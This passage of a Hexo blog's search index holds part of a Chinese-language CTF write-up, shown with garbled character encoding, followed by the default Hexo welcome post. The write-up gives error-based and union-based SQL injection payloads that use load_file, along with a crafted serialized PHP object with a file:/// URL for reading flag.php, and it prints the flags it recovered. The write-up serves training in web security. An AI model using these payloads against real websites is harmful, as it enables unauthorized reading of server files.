<span class="hljs-title function_ invoke__">curl_getinfo</span>(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$httpCode</span> == <span class="hljs-number">404</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;<br>        &#125;<br>        <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;<br>    &#125;<br>    <span class="hljs-comment">//blogå†…å®¹çš„å¤„ç†</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;blog);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$blog</span> = <span class="hljs-variable language_">$this</span>-&gt;blog;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="hljs-variable">$blog</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>è¯¥ä»£ç å±•ç¤ºäº†ä¸€ä¸ªUserInFoçš„ç±»çš„å…·ä½“å†…å®¹å’Œå‚æ•°ï¼Œä»¥ä¾¿ä¹‹åçš„åºåˆ—åŒ–å¤„ç†</p><p>14.ç”±ç½‘é¡µæ˜¾ç¤ºçš„å†…å®¹å¾—ï¼š</p><p><strong>the contents of his&#x2F;her blog</strong></p><p><strong>ä¸‹é¢ä¸€å—ä¸å¯è§åŒºåŸŸä¸ºï¼Œæˆ‘ä»¬è¾“å…¥çš„blogï¼ˆåšå®¢ï¼‰çš„å†…å®¹ï¼Œæ‰€ä»¥çŒœæµ‹å¦‚æœæˆ‘ä»¬è¾“å…¥çš„åšå®¢å†…å®¹ä¸ºflag.php,åˆ™ä¼šæ˜¾ç¤ºè¯¥æ–‡ä»¶çš„å†…å®¹ï¼Œä½†æ˜¯æˆ‘ä»¬è¦çŸ¥é“ç½‘ç«™flag.phpçš„å…·ä½“æ–‡ä»¶è·¯å¾„</strong></p><p><strong>ç½‘é¡µä¸­æºä»£ç çš„æè¿°è¿™å—å†…å®¹:</strong><br><strong>src &#x3D; â€˜data:text&#x2F;html;base64,PCFâ€¦â€¦â€¦â€™</strong></p><p><strong>æ‰€ä»¥dataçš„ç±»å‹æ˜¯textæ–‡æœ¬å‹</strong></p><p>æ‰€ä»¥ç½‘é¡µçš„æºåœ°å€ä¼ è¾“ä¸ºdata,çŒœæµ‹å¯èƒ½åˆ©ç”¨çš„æ˜¯ç¬¬å››ä¸ªå­—æ®µdataä¸­çš„å†…å®¹:</p><p>O:8:â€UserInfoâ€:3:{s:4:â€nameâ€;s:5:â€adminâ€;s:3:â€ageâ€;i:13;s:4:â€blogâ€;s:7:â€bai.comâ€;} </p><p>dataå­—æ®µä¸­çš„å†…å®¹æ˜¯ç»è¿‡åºåˆ—åŒ–å¤„ç†çš„ç»“æœ</p><p>15.åˆ©ç”¨æŠ¥é”™æ³¨å…¥è·å–flag.phpçš„æ–‡ä»¶è·¯å¾„:</p><p>or(updatexml(1,concat(â€˜<del>â€˜,(SELECT(load_file(â€œflag.phpâ€)),â€™</del>â€˜),1))#</p><p>or(updatexml(1,concat(0x7e,(SELECT(database())),0x7e),1))#</p><p>é€šè¿‡ç­›é€‰ï¼Œå‘ç°ç½‘ç«™è¿‡æ»¤äº†â€™xâ€™</p><p>æ‰€ä»¥ç”¨å­—ç¬¦â€™<del>â€˜:or(updatexml(1,concat(â€˜</del>â€˜,(SELECT(load_file(â€œflag.phpâ€)),â€™~â€™),1))#</p><p>è¿”å›æŠ¥é”™å†…å®¹:</p><p>[*] query error! (Incorrect parameter count in the call to native function â€˜updatexmlâ€™)</p><p><strong>Fatal error</strong>:  Call to a member function fetch_assoc() on boolean in <strong>&#x2F;var&#x2F;www&#x2F;html&#x2F;db.php</strong> on line <strong>66</strong></p><p>æ‰€ä»¥æˆ‘ä»¬çŒœæµ‹flag.phpçš„åœ°å€ä¸º&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</p><p><strong>å…¶å®ï¼Œéšä¾¿è¾“å…¥ä¸€ä¸ªé”™è¯¯çš„å‚æ•°éƒ½ä¼šæŠ¥é”™æ˜¾ç¤ºåœ°å€&#x2F;var&#x2F;www&#x2F;html&#x2F;db.phpï¼Œæ‰€ä»¥ä¸€å®šè¦æ³¨æ„ä»»ä½•æŠ¥é”™ä¿¡æ¯</strong></p><p>16.æ‰€ä»¥blog&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</p><p>æ‰€ä»¥è¦çˆ†å‡ºè¯¥æ–‡ä»¶çš„å†…å®¹:select load_file(â€œæ–‡ä»¶è·¯å¾„â€);å¯ä»¥è·å–è¯¥æ–‡ä»¶çš„å†…å®¹</p><p>-1 union&#x2F;*!select *&#x2F;1,load_file(â€œ&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.phpâ€),3,4</p><p><strong>usernameæ²¡æœ‰è¿”å›å†…å®¹ï¼Œä½†æ˜¯é¡µé¢äº§ç”Ÿäº†å“åº”ï¼Œè¯´æ˜usernameæ‰€æ˜¾ç¤ºçš„å†…å®¹ï¼Œä¸ç¬¦åˆè¯¥å­—æ®µæ‰€èƒ½æ˜¾ç¤ºçš„å†…å®¹çš„æ ¼å¼ï¼Œå¯ä»¥é€šè¿‡æŸ¥çœ‹ç½‘é¡µæºä»£ç ï¼ŒæŸ¥çœ‹æœ¬æ¥åº”è¯¥åœ¨è¯¥å­—æ®µä¸­æ˜¾ç¤ºçš„å†…å®¹ï¼š</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs html">    <span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;table&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span><br>                username<br>            <span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span><br>                age<br>            <span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span><br>                blog<br>            <span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><br>                <span class="hljs-meta">&lt;?php</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$flag = &quot;flag&#123;ab61868d-16df-4976-93c7-8980c7fbc7be&#125;&quot;;</span><br><span class="hljs-meta">exit(0);</span><br><span class="hljs-meta">            &lt;/td&gt;</span><br><span class="hljs-meta">            &lt;td&gt;</span><br><span class="hljs-meta">                &lt;br /&gt;</span><br><span class="hljs-meta">&lt;b&gt;Notice&lt;/b&gt;:  Trying to get property of non-object in &lt;b&gt;/var/www/html/view.php&lt;/b&gt; on line &lt;b&gt;53&lt;/b&gt;&lt;br /&gt;</span><br><span class="hljs-meta">            &lt;/td&gt;</span><br><span class="hljs-meta">            &lt;td&gt;</span><br><span class="hljs-meta">                &lt;br /&gt;</span><br><span class="hljs-meta">&lt;b&gt;Notice&lt;/b&gt;:  Trying to get property of non-object in &lt;b&gt;/var/www/html/view.php&lt;/b&gt; on line &lt;b&gt;56&lt;/b&gt;&lt;br /&gt;</span><br><span class="hljs-meta">            &lt;/td&gt;</span><br><span class="hljs-meta">        &lt;/tr&gt;</span><br><span class="hljs-meta">    &lt;/table&gt;</span><br></code></pre></td></tr></table></figure><p>æ‰€ä»¥flagä¸º:</p><p>flag{ab61868d-16df-4976-93c7-8980c7fbc7be}</p><p>16.å¦‚æœç½‘ç«™è¿‡æ»¤äº†load_file(â€œè·¯å¾„â€):</p><p>ç¬¬å››ä¸ªå­—æ®µdataæ‰€æ˜¾ç¤ºçš„ä½ç½®ä¸º:the contents of his&#x2F;her blog</p><p>è¯¥å­—æ®µä¸ºå°†å­˜å‚¨äºæ•°æ®åº“ä¸­çš„å¦‚O:8:â€UserInfoâ€:3:{s:4:â€nameâ€;s:5:â€adminâ€;s:3:â€ageâ€;i:13;s:4:â€blogâ€;s:7:â€bai.comâ€;} çš„å†…å®¹å–å‡ºï¼Œç„¶åæ ¹æ®è¯¥dataä¸­blogçš„åœ°å€ï¼Œè®¿é—®å‡ºblogçš„å†…å®¹ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è®©å®ƒæ˜¾ç¤º&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.phpçš„å†…å®¹</p><p>å‡è®¾å®ƒç½‘é¡µæ˜¯å¯¹è¿™ä¸ªåºåˆ—åŒ–çš„å†…å®¹base-64åŠ å¯†ç„¶åè®¿é—®ï¼Œåˆ™æˆ‘ä»¬ä¹Ÿåªéœ€è¦è®©å®ƒè®¿é—®åºåˆ—åŒ–çš„dataï¼š</p><p>O:8:â€UserInfoâ€:3:{s:4:â€nameâ€;s:5:â€adminâ€;s:3:â€ageâ€;i:13;s:4:â€blogâ€;s:29:â€file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.phpâ€;}</p><p>payload:</p><p>-1 union&#x2F;*!select *&#x2F;1,2,3,â€™O:8:â€UserInfoâ€:3:{s:4:â€nameâ€;s:5:â€adminâ€;s:3:â€ageâ€;i:13;s:4:â€blogâ€;s:29:â€file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.phpâ€ï¼›}â€™:</p><p><strong>the contents of his&#x2F;her blog,æ²¡æœ‰æ˜¾ç¤ºå†…å®¹ï¼Œå¯èƒ½ä¾ç„¶ä¸ºéè¯¥å­—æ®µçš„æ ¼å¼å†…å®¹ï¼Œæ‰€ä»¥æŸ¥çœ‹ç½‘é¡µæºä»£ç :</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>the contents of his/her blog<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&#x27;100%&#x27;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&#x27;10em&#x27;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&#x27;data:text/html;base64,PD9waHANCg0KJGZsYWcgPSAiZmxhZ3sxOTUxNDdkZi1iN2NhLTQ1NjAtYmVjYi1kOTg1OTI4NTBmYzh9IjsNCmV4aXQoMCk7DQo=&#x27;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>è¿™ä¸ªåŒºåŸŸæ˜¾ç¤ºçš„å†…å®¹ä¸ºsrcæ‰€æŒ‡å‘åŒºåŸŸï¼Œæ‰€ä»¥ç‚¹å‡»srcæ‰€æŒ‡å‘çš„åŒºåŸŸ:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;flag&#123;195147df-b7ca-4560-becb-d98592850fc8&#125;&quot;</span>;<br><span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p>å¾—åˆ°flag.phpçš„å†…å®¹</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/08/21/hello-world/"/>
    <url>/2023/08/21/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>First_blog</title>
    <link href="/2023/08/21/First-blog/"/>
    <url>/2023/08/21/First-blog/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
